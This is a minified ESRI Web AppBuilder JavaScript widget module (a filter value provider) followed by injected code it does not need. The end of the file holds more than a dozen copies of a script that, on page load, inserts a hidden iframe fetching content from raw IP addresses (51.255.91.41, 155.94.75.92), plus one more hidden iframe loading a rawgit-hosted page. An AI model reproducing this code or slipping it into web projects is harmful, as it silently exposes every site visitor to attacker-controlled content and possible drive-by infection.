// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin jimu/utils esri/lang".split(" "),function(e,g,c,h,d,k,l,m,f,n){return k([l,m,g],{baseClass:"jimu-filter-value-provider",fieldName:null,shortType:null,_enabled:!1,cascade:"none",filterCodedValue:!1,fieldPopupInfo:null,nls:null,url:null,layerDefinition:null,fieldInfo:null,partObj:null,runtime:!0,staticValues:null,codedValues:null,layerInfo:null,popupInfo:null,operatorInfo:null,
filterCodedValueIfPossible:!1,postMixInProperties:function(){this.inherited(arguments);this.shortType=this.partObj.fieldObj.shortType;this.fieldName=this.partObj.fieldObj.name;this.cascade=this.partObj.interactiveObj&&this.partObj.interactiveObj.cascade;this.runtime&&this.codedValues&&this.filterCodedValueIfPossible&&f.isCodedValuesSupportFilter(this.layerDefinition,this.codedValues.length)?this.filterCodedValue=!0:this.filterCodedValue=!1;this.popupInfo&&this.popupInfo.fieldInfos&&0<this.popupInfo.fieldInfos.length&&
d.some(this.popupInfo.fieldInfos,c.hitch(this,function(a){return a.fieldName===this.fieldName?(this.fieldPopupInfo=a,!0):!1}))},getDijits:function(){return[]},bindChangeEvents:function(){var a=this.getDijits();d.forEach(a,c.hitch(this,function(a){a.declaredClass&&0===a.declaredClass.indexOf("dijit.")&&h.addClass(a.domNode,a.declaredClass.replace(/\./g,"-"));this.own(e(a,"change",c.hitch(this,this._onChanged)));this.own(e(a,"enter",c.hitch(this,this._onEnter)))}))},_onChanged:function(){this._onEnterTriggered||
this.emit("change")},_onEnterTriggered:!1,_onEnter:function(){this._onEnterTriggered=!0;this.emit("change");setTimeout(c.hitch(this,function(){this._onEnterTriggered=!1}),100)},tryLocaleNumber:function(a){var b=f.localizeNumber(a);if(null===b||void 0===b)b=a;return b},getPartObject:function(){var a=this.getValueObject();if(!a)return null;var b=c.clone(this.partObj);b.valueObj=a;return b},setValueObject:function(){},getValueObject:function(){},tryGetValueObject:function(){return this.getValueObject()},
setRequired:function(){},getStatus:function(){var a=1,b=this.getDijits();0<b.length&&(a=d.map(b,c.hitch(this,function(a){return"function"===typeof a.getStatus?a.getStatus():this.getStatusForDijit(a)})),a=Math.min.apply(a,a));return a},getStatusForDijit:function(a){return a.validate()?a.get("DisplayedValue")?1:0:-1},isInvalidValue:function(){return 0>this.getStatus()},isEmptyValue:function(){return 0===this.getStatus()},isValidValue:function(){return 0<this.getStatus()},isBlankValueProvider:function(){return!1},
getFilterExpr:function(){var a="1\x3d1",a=this.getLayerFilterExpr();if("all"===this.cascade||"previous"===this.cascade)var b=this.getCascadeFilterExpr(),a="("+a+") AND ("+b+")";return a},getLayerFilterExpr:function(){var a="1\x3d1";this.layerInfo&&(a=this.layerInfo.getFilter());a||(a="1\x3d1");return a},_getWebMapFilterExpr:function(){var a="";this.layerInfo&&(a=this.layerInfo.getFilterOfWebmap());a||(a="1\x3d1");return a},getDropdownFilterExpr:function(){var a="1\x3d1",a=this._getWebMapFilterExpr();
if("all"===this.cascade||"previous"===this.cascade)var b=this.getCascadeFilterExpr(),a="("+a+") AND ("+b+")";return a},getCascadeFilterExpr:function(){return"1\x3d1"},isDefined:function(a){return n.isDefined(a)},disable:function(){this._enabled=!1},enable:function(){this._enabled=!0},isEnabled:function(){return this._enabled}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});